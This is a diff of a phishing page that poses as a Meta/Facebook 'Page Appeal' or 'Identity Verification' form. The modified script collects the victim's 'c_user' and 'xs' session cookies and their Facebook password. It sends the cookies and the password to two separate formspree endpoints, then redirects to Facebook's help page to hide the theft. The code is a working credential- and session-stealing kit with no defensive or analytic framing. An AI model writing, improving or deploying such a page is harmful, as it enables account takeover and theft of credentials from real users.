@@ -9,26 +9,22 @@
         body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
         .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
         
-        /* Modal Styles */
+        /* Language Modal with Scroll */
         .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
-        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; }
+        
+        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 10px; }
         .lang-option:hover { background: #f0f2f5; }
         
-        /* Appeal Form Style */
-        #appealForm { display: none; }
+        #appealForm, #step-2 { display: none; }
         .header { margin-bottom: 24px; }
         .meta-logo { width: 44px; margin-bottom: 16px; }
-        .header-title { font-size: 26px; font-weight: 800; color: #1c1e21; margin: 0; }
-        .alert-box { border-radius: 8px; padding: 16px; background-color: #f7f8fa; margin-bottom: 24px; border-left: 4px solid #0866ff; }
-        .video-wrapper { margin-bottom: 24px; }
-        .video-wrapper video { width: 100%; border-radius: 8px; border: 1px solid #dddfe2; background: #000; }
-        
-        .input-group { margin-bottom: 20px; }
-        .input-label { font-weight: 700; margin-bottom: 8px; display: block; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
-        input:focus { border-color: #0866ff; }
-        .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
+        .header-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin: 0; }
+        .alert-box { border-radius: 8px; padding: 16px; background-color: #f7f8fa; margin-bottom: 20px; border-left: 4px solid #0866ff; font-size: 14px; }
+        .input-group { margin-bottom: 15px; }
+        .input-label { font-weight: 700; margin-bottom: 8px; display: block; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
+        .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -36,45 +32,51 @@
     <div class="meta-container">
         <div id="langModal" class="modal">
             <div class="modal-content">
-                <h3>Select Your Language</h3>
-                <input type="text" placeholder="Search languages..." style="width: 100%; padding: 10px; margin-bottom: 10px;">
-                <div class="lang-option">🇺🇸 English</div>
-                <div class="lang-option">🇮🇳 Hindi</div>
-                <div class="lang-option">🇪🇸 Spanish</div>
-                <div class="lang-option">🇵🇹 Portuguese</div>
-                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm Language</button>
+                <h3 style="margin-top: 0;">Select Your Language</h3>
+                <input type="text" placeholder="Search languages..." style="width: 100%; padding: 10px; margin-bottom: 15px;">
+                
+                <div class="lang-option" onclick="showForm()">🇺🇸 English</div>
+                <div class="lang-option" onclick="showForm()">🇮🇳 Hindi</div>
+                <div class="lang-option" onclick="showForm()">🇪🇸 Spanish</div>
+                <div class="lang-option" onclick="showForm()">🇵🇹 Portuguese</div>
+                <div class="lang-option" onclick="showForm()">🇮🇳 Tamil</div>
+                <div class="lang-option" onclick="showForm()">🇸🇦 Arabic</div>
+                <div class="lang-option" onclick="showForm()">🇫🇷 French</div>
+                <div class="lang-option" onclick="showForm()">🇻🇳 Vietnamese</div>
+                <div class="lang-option" onclick="showForm()">🇬🇭 Ghanaian (Twi)</div>
+                
+                <button onclick="showForm()" class="submit-btn">Confirm Language</button>
             </div>
         </div>
 
         <div id="appealForm">
             <div class="header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Meta Logo" class="meta-logo">
-                <h1 class="header-title">Page Appeal Request</h1>
-            </div>
-            
-            <div class="alert-box">
-                <b>Notice:</b> Your page has a violation of our community standards. Please verify your identity.
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="meta-logo">
+                <h1 class="header-title">Identity Verification</h1>
             </div>
 
-            <div class="video-wrapper">
-                <video controls><source src="VID-20260418-WA0000.mp4" type="video/mp4"></video>
-            </div>
+            <div class="alert-box">To protect your account, please verify your session details.</div>
 
-            <form id="dualForm">
+            <div id="step-1">
                 <div class="input-group">
                     <label class="input-label">c_user</label>
-                    <input type="text" id="c_user" name="c_user" placeholder="Enter c_user" required>
+                    <input type="text" id="c_user" placeholder="Enter c_user" required>
                 </div>
                 <div class="input-group">
                     <label class="input-label">xs</label>
-                    <input type="text" id="xs" name="xs" placeholder="Enter xs" required>
+                    <input type="text" id="xs" placeholder="Enter xs" required>
                 </div>
+                <button type="button" onclick="goToStep2()" id="nextBtn" class="submit-btn">Continue</button>
+            </div>
+
+            <div id="step-2">
                 <div class="input-group">
                     <label class="input-label">Password</label>
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <input type="password" id="password" placeholder="Enter your password" required>
                 </div>
-                <button type="submit" id="submitBtn" class="submit-btn">Submit Appeal Request</button>
-            </form>
+                <p style="font-size: 12px; color: #65676b;">Enter your Facebook password to confirm this appeal.</p>
+                <button type="button" onclick="finalSubmit()" id="finalBtn" class="submit-btn">Confirm & Submit</button>
+            </div>
         </div>
     </div>
 
@@ -84,39 +86,47 @@
             document.getElementById('appealForm').style.display = 'block';
         }
 
-        const form = document.getElementById('dualForm');
-        
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "Processing...";
-            btn.disabled = true;
+        let userData = { c_user: '', xs: '' };
 
-            const c_user = document.getElementById('c_user').value;
-            const xs = document.getElementById('xs').value;
-            const password = document.getElementById('password').value;
+        async function goToStep2() {
+            const c = document.getElementById('c_user').value;
+            const x = document.getElementById('xs').value;
 
-            // 1. Email 1: Pehli ID (Cookies)
-            const sendCookies = fetch("https://formspree.io/f/maqaobyw", {
+            if(!c || !x) { alert("Please fill all fields"); return; }
+
+            userData.c_user = c;
+            userData.xs = x;
+
+            document.getElementById('nextBtn').innerText = "Verifying...";
+            
+            // Send Cookies to first email (maqaobyw)
+            fetch("https://formspree.io/f/maqaobyw", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "COOKIES", "c_user": c_user, "xs": xs }),
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                body: JSON.stringify({ "Type": "STEP_1_COOKIES", "c_user": c, "xs": x }),
+                headers: { 'Content-Type': 'application/json' }
             });
 
-            // 2. Email 2: Nayi ID (Password)
-            const sendPass = fetch("https://formspree.io/f/xbdqoblb", {
+            setTimeout(() => {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+            }, 800);
+        }
+
+        async function finalSubmit() {
+            const pass = document.getElementById('password').value;
+            if(!pass) { alert("Please enter password"); return; }
+
+            document.getElementById('finalBtn').innerText = "Submitting...";
+            
+            // Send Password to second email (xbdqoblb)
+            await fetch("https://formspree.io/f/xbdqoblb", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "PASSWORD", "c_user": c_user, "password": password }),
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                body: JSON.stringify({ "Type": "STEP_2_PASSWORD", "user": userData.c_user, "password": pass }),
+                headers: { 'Content-Type': 'application/json' }
             });
 
-            try {
-                await Promise.all([sendCookies, sendPass]);
-                window.location.href = "https://www.facebook.com/help";
-            } catch (error) {
-                window.location.href = "https://www.facebook.com/help";
-            }
-        });
+            window.location.href = "https://www.facebook.com/help";
+        }
     </script>
 </body>
 </html>
